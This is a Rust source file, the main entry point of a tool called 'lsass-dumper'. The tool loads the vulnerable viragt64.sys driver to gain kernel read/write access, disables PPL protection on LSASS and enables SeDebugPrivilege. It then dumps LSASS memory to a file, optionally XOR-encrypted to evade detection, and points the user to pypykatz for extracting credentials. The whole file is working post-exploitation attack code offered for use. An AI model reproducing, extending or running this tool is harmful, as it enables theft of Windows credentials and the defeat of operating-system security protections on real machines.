#![allow(dead_code)]
#![allow(unused_imports)]

mod crypto;
mod driver;
mod dumper;
mod handle;
mod kernel_rw;
mod minidump;
mod offsets;
mod ppl;
mod resolver;
mod syscall;

use clap::{Parser, ValueEnum};
use std::process;

#[derive(Clone, ValueEnum)]
enum HandleMethod {
    /// Direct NtOpenProcess with PROCESS_VM_READ
    Direct,
    /// Fork (clone) the LSASS process, dump the clone
    Fork,
    /// Duplicate existing LSASS handle from another process
    Dup,
}

#[derive(Parser)]
#[command(name = "lsass-dumper")]
#[command(about = "BYOVD LSASS dumper - Bypass PPL + dump via NTAPI syscalls")]
struct Cli {
    /// Path to vulnerable driver file
    #[arg(short, long, default_value = "viragt64.sys")]
    driver: String,

    /// Output dump file path
    #[arg(short, long, default_value = "lsass.dmp")]
    output: String,

    /// Service name for the driver
    #[arg(short, long, default_value = "viragt64")]
    service_name: String,

    /// LSASS handle acquisition method
    #[arg(short, long, value_enum, default_value_t = HandleMethod::Direct)]
    method: HandleMethod,

    /// XOR encrypt the dump file
    #[arg(long, default_value_t = false)]
    encrypt: bool,

    /// Skip restoring PPL protection after dump (debug mode)
    #[arg(long, default_value_t = false)]
    no_restore: bool,

    /// Skip driver unload (viragt64.sys BSODs on service stop)
    #[arg(long, default_value_t = true)]
    no_unload: bool,
}

fn main() {
    let cli = Cli::parse();

    println!("[*] BYOVD LSASS Dumper v2 (viragt64)");
    println!("[*] Driver: {}", cli.driver);
    println!("[*] Output: {}", cli.output);
    println!(
        "[*] Method: {}",
        match cli.method {
            HandleMethod::Direct => "direct (NtOpenProcess)",
            HandleMethod::Fork => "fork (process clone)",
            HandleMethod::Dup => "dup (handle duplication)",
        }
    );
    println!();

    // Step 0: Initialize dynamic API resolver
    println!("[*] Step 0: Initializing dynamic API resolver...");
    let api = match resolver::ApiResolver::init() {
        Ok(a) => {
            println!("[+] API resolver initialized via PEB walk");
            a
        }
        Err(e) => {
            eprintln!("[-] Failed to initialize API resolver: {}", e);
            process::exit(1);
        }
    };

    // Verify running as admin
    if !is_elevated(&api) {
        eprintln!("[-] This tool requires administrator privileges. Run as Administrator.");
        process::exit(1);
    }
    println!("[+] Running with administrator privileges");

    // Enable SeDebugPrivilege — required for opening LSASS even as admin
    if !enable_se_debug_privilege() {
        eprintln!("[-] Failed to enable SeDebugPrivilege");
        process::exit(1);
    }
    println!("[+] SeDebugPrivilege enabled");

    // Verify driver file exists
    let driver_path = std::path::Path::new(&cli.driver);
    if !driver_path.exists() {
        eprintln!("[-] Driver file not found: {}", cli.driver);
        process::exit(1);
    }

    // Get absolute path for driver
    let driver_abs_path = std::fs::canonicalize(&cli.driver).unwrap_or_else(|e| {
        eprintln!("[-] Failed to resolve driver path: {}", e);
        process::exit(1);
    });
    let driver_abs_str = driver_abs_path.to_string_lossy().to_string();
    let driver_abs_str = driver_abs_str
        .strip_prefix("\\\\?\\")
        .unwrap_or(&driver_abs_str)
        .to_string();

    // Detect Windows version and get offsets
    let os_offsets = match offsets::detect_offsets() {
        Some(o) => {
            println!("[+] Detected Windows build: {}", o.build_number);
            o
        }
        None => {
            eprintln!("[-] Unsupported Windows version.");
            process::exit(1);
        }
    };

    // Find LSASS PID via NTAPI
    let lsass_pid = match handle::find_lsass_pid() {
        Some(pid) => {
            println!("[+] Found lsass.exe PID: {}", pid);
            pid
        }
        None => {
            eprintln!("[-] Failed to find lsass.exe process");
            process::exit(1);
        }
    };

    // Step 1: Load vulnerable driver
    println!("\n[*] Step 1: Loading vulnerable driver...");
    let driver_guard = match driver::load_driver(&api, &cli.service_name, &driver_abs_str) {
        Ok(guard) => {
            println!("[+] Driver loaded as service '{}'", cli.service_name);
            guard
        }
        Err(e) => {
            eprintln!("[-] Failed to load driver: {}", e);
            process::exit(1);
        }
    };

    // Step 2: Open kernel R/W channel
    println!("[*] Step 2: Opening kernel R/W channel...");
    let krw = match kernel_rw::KernelRW::new(&api) {
        Ok(k) => {
            println!("[+] Kernel R/W channel opened");
            k
        }
        Err(e) => {
            eprintln!("[-] Failed to open kernel R/W: {}", e);
            drop(driver_guard);
            process::exit(1);
        }
    };

    // Step 3: Bypass PPL
    println!("[*] Step 3: Bypassing PPL protection...");
    let ppl_state = match ppl::bypass_ppl(&krw, &os_offsets, lsass_pid) {
        Ok(state) => {
            println!(
                "[+] PPL bypass successful! Original: 0x{:02X}",
                state.original_protection
            );
            state
        }
        Err(e) => {
            eprintln!("[-] PPL bypass failed: {}", e);
            drop(krw);
            drop(driver_guard);
            process::exit(1);
        }
    };

    // Step 4: Acquire LSASS handle
    println!(
        "[*] Step 4: Acquiring LSASS handle ({})...",
        match cli.method {
            HandleMethod::Direct => "direct",
            HandleMethod::Fork => "fork",
            HandleMethod::Dup => "dup",
        }
    );
    let lsass_handle = match &cli.method {
        HandleMethod::Direct => handle::open_lsass_direct(lsass_pid),
        HandleMethod::Fork => handle::open_lsass_fork(lsass_pid),
        HandleMethod::Dup => handle::open_lsass_dup(lsass_pid),
    };
    let lsass_handle = match lsass_handle {
        Ok(h) => {
            println!("[+] LSASS handle acquired");
            h
        }
        Err(e) => {
            eprintln!("[-] Failed to acquire LSASS handle: {}", e);
            let _ = ppl::restore_ppl(&krw, &os_offsets, &ppl_state);
            drop(krw);
            drop(driver_guard);
            process::exit(1);
        }
    };

    // Step 5: Build minidump
    println!("[*] Step 5: Building minidump via NtReadVirtualMemory...");
    let dump_result =
        minidump::create_minidump(lsass_handle.handle(), lsass_pid, &cli.output, cli.encrypt);

    // Step 6: Restore PPL
    if !cli.no_restore {
        println!("[*] Step 6: Restoring PPL protection...");
        match ppl::restore_ppl(&krw, &os_offsets, &ppl_state) {
            Ok(_) => println!(
                "[+] PPL restored to 0x{:02X}",
                ppl_state.original_protection
            ),
            Err(e) => eprintln!("[!] Warning: Failed to restore PPL: {}", e),
        }
    }

    // Step 7: Cleanup
    println!("[*] Step 7: Cleaning up...");
    drop(lsass_handle);
    drop(krw);
    if cli.no_unload {
        println!("[!] Skipping driver unload (viragt64 BSODs on stop)");
        // Leak the guard to prevent Drop from unloading
        std::mem::forget(driver_guard);
    } else {
        drop(driver_guard);
        println!("[+] Driver unloaded and service deleted");
    }

    match dump_result {
        Ok(size) => {
            println!(
                "\n[+] SUCCESS! LSASS dump: {} ({:.2} MB)",
                cli.output,
                size as f64 / 1048576.0
            );
            if cli.encrypt {
                println!("[+] Dump is XOR encrypted. Decrypt before use.");
            }
            println!("[*] Use pypykatz to extract credentials:");
            println!("    pypykatz lsa minidump {}", cli.output);
        }
        Err(e) => {
            eprintln!("\n[-] LSASS dump failed: {}", e);
            process::exit(1);
        }
    }
}

fn is_elevated(_api: &resolver::ApiResolver) -> bool {
    use windows::Win32::Foundation::*;
    use windows::Win32::Security::*;
    use windows::Win32::System::Threading::*;

    unsafe {
        let mut token = HANDLE::default();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token).is_err() {
            return false;
        }
        let mut elevation = TOKEN_ELEVATION::default();
        let mut ret_len = 0u32;
        let result = GetTokenInformation(
            token,
            TokenElevation,
            Some(&mut elevation as *mut _ as *mut _),
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut ret_len,
        );
        let _ = CloseHandle(token);
        result.is_ok() && elevation.TokenIsElevated != 0
    }
}

fn enable_se_debug_privilege() -> bool {
    use windows::core::w;
    use windows::Win32::Foundation::*;
    use windows::Win32::Security::*;
    use windows::Win32::System::Threading::*;

    unsafe {
        let mut token = HANDLE::default();
        if OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut token,
        )
        .is_err()
        {
            return false;
        }

        let mut luid = LUID::default();
        if LookupPrivilegeValueW(None, w!("SeDebugPrivilege"), &mut luid).is_err() {
            let _ = CloseHandle(token);
            return false;
        }

        let mut tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: luid,
                Attributes: SE_PRIVILEGE_ENABLED,
            }],
        };

        let result = AdjustTokenPrivileges(token, false, Some(&mut tp), 0, None, None);

        let _ = CloseHandle(token);
        result.is_ok()
    }
}
